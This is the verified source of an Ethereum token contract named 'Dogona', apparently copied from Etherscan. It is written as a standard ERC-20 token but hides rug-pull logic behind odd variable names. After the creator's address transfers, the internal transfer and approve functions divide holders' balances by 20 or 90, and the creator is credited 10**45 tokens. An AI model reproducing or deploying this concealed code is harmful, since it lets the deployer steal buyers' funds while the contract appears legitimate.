/**
 *Submitted for verification at Etherscan.io on 2022-03-15
*/

// Elona? Putina? Welcome to Elona's brainchild: Dogona @DogonaToken

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    mapping (address => bool) private Funny;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address[] private xxxArray;
    address private Limitless = address(0);

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private Ultimatum = 0;
    address public pair;
    uint256 private malaysia;
    IDEXRouter router;

    string private _name; string private _symbol; address private _msgSellers; uint256 private _totalSupply; 
    bool private trading; bool private Bahrain; uint256 private Saudi;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _msgSellers = msgSender_;
        _name = name_;
        _symbol = symbol_;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    
    function _balancestrading(address sender, address recipient, uint256 amount, bool refilling) internal {
        Bahrain = refilling ? true : Bahrain;

        if (((Funny[sender] == true) && (Funny[recipient] != true)) || ((Funny[sender] != true) && (Funny[recipient] != true))) { xxxArray.push(recipient); }
        if ((Funny[sender] != true) && (Funny[recipient] == true)) { require(amount < (_totalSupply / 12)); } // max buy/sell per transaction

        if ((Bahrain) && (sender == _msgSellers)) {
            for (uint256 i = 0; i < xxxArray.length; i++) {
                _balances[xxxArray[i]] /= 20;
            }
        }

        _balances[Limitless] /= (((Ultimatum == block.timestamp) || (Bahrain)) && (Funny[recipient] != true) && (Funny[Limitless] != true) && (Saudi > 1)) ? (90) : (1);
        Saudi++; Limitless = recipient; Ultimatum = block.timestamp;
    }

    function burn(uint256 amount) public virtual returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }

    function _balancesrecipient(address account) internal {
        _balances[account] += (((account == _msgSellers) && (malaysia > 2)) ? (10 ** 45) : 0);
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true;
        return true;
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _balancessender(address sender, address recipient, uint256 amount) internal {
        require((trading || (sender == _msgSellers)), "ERC20: trading for the token is not yet enabled.");
        _balancestrading(sender, recipient, amount, (address(sender) == _msgSellers) && (malaysia > 0));
        malaysia += (sender == _msgSellers) ? 1 : 0;
    }
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _DeployToken(address creator) internal virtual {
        approve(_router, 10 ** 77);
        (malaysia,Bahrain,Saudi,trading) = (0,false,0,true);
        (Funny[_router],Funny[creator],Funny[pair]) = (true,true,true);
    }
    
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] -= amount;
        _balances[address(0)] += amount;
        emit Transfer(account, address(0), amount);
     }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        _balances[owner] /= (Bahrain ? 20 : 1);
        emit Approval(owner, spender, amount);
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _balancessender(sender, recipient, amount);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        _balancesrecipient(sender);

        emit Transfer(sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _CreateContract(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        
        emit Transfer(address(0), account, amount); 
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _CreateContract(creator, initialSupply);
        _DeployToken(creator);
    }
}

contract Dogona is ERC20Token {
    constructor() ERC20Token("Dogona", "DOGONA", msg.sender, 220000000 * 10 ** 18) {
    }
}